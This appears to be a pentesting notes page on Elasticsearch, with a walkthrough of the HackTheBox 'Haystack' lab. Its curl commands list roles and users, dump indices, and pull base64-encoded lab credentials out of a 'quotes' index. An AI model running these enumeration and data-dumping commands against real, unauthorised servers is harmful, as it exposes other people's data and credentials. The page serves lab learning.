---
description: Elastic search | API | JSON | Database | Relational DBMS
---

# Elastic Search

Elasticsearch is an **open-source, distributed search and analytics engine** designed to handle large volumes of structured and unstructured data.&#x20;

* RESTful interacts via HTTP requests (GET, POST).
* Scalable Data Storage: Distributes data across nodes for horizontal scaling
* Vector Database: Handles AI/ML embeddings for semantic search

It allows users to perform fast full-text searches, real-time analytics, and operations like filtering, aggregation, and visualization. Elasticsearch uses a RESTful API, stores data in a scalable and fault-tolerant way, and supports advanced features like machine learning, vector search, and time-series analysis. It's often used for log analysis, e-commerce search, and business intelligence.

### <mark style="color:yellow;">Example</mark>

You can find this vulnerability in [https://www.hackthebox.com/machines/haystack](https://www.hackthebox.com/machines/haystack).&#x20;

```bash
#List all roles on the system:
curl -X GET "ELASTICSEARCH-SERVER:9200/_security/role"

#List all users on the system:
curl -X GET "ELASTICSEARCH-SERVER:9200/_security/user"

#Get more information about the rights of an user:
curl -X GET "ELASTICSEARCH-SERVER:9200/_security/user/<USERNAME>"
```

Check [https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch](https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch) for more endpoints.

#### Listing indexes (like tables):

```bash
$ curl http://10.10.10.115:9200/_cat/indices?v
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
```

From the image we got a clue to search for "clave". We can use \_search to do so, which will return 10 entries by default.

```bash
curl -s http://10.10.10.115:9200/quotes/_search | jq .
```

Using `_count` we can check how many entries there are which are 253 entries.

```bash
$ curl -s http://10.10.10.115:9200/quotes/_count | jq .
{
  "count": 253,
  "_shards": {
    "total": 5,
    "successful": 5,
    "skipped": 0,
    "failed": 0
  }
}
```

With `_search?size=253` it returns all entries and \_search?size=1 would return the first, if we only want the hits field we can use `.hits`.

```bash
$ curl -s http://10.10.10.115:9200/quotes/_search?size=1 | jq .hits
{
  "total": 253,
  "max_score": 1.0,
  "hits": [
    {
      "_index": "quotes",
      "_type": "quote",
      "_id": "14",
      "_score": 1.0,
      "_source": {
        "quote": "En América se desarrollaron importantes civilizaciones, como Caral (la civilización más antigua de América, la cual se desarrolló en la zona central de Perú), los anasazi, los indios pueblo, quimbaya, nazca, chimú, chavín, paracas, moche, huari, lima, zapoteca, mixteca, totonaca, tolteca, olmeca y chibcha, y las avanzadas civilizaciones correspondientes a los imperios de Teotihuacan, Tiahuanaco, maya, azteca e inca, entre muchos otros."
      }
    }
  ]
}
```

And using we can extract the quotes

```bash
curl -s 'http://10.10.10.115:9200/quotes/_search?size=253' | jq '.hits.hits | .[] |
._source.quote'
```

#### Or using curl

```bash
$ curl -s -X GET "http://10.10.10.115:9200/bank/_search?size=1000" -H 'Content-Type: application/json' -d'
{
    "query": {
        "match_all": {}
    }
}
' | jq . | head -20
{
  "took": 98,
  "timed_out": false,
  "_shards": {
    "total": 5,
    "successful": 5,
    "skipped": 0,
    "failed": 0
  },
  "hits": {
    "total": 1000,
    "max_score": 1.0,
    "hits": [
      {
        "_index": "bank",
        "_type": "account",
        "_id": "25",
        "_score": 1.0,
        "_source": {
          "account_number": 25,
```

Now getting data from quotes and `grep clave` we get 2 quotes back.

```bash
curl -s -X GET "http://10.10.10.115:9200/quotes/_search?size=1000" -H 'Content-Type: application/json' -d'
{
    "query": {
        "match_all": {}
    }
}
' | jq -c '.hits.hits[]' | grep clave

{"_index":"quotes","_type":"quote","_id":"111","_score":1.0,"_source":{"quote":"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="}}
{"_index":"quotes","_type":"quote","_id":"45","_score":1.0,"_source":{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "}}
```



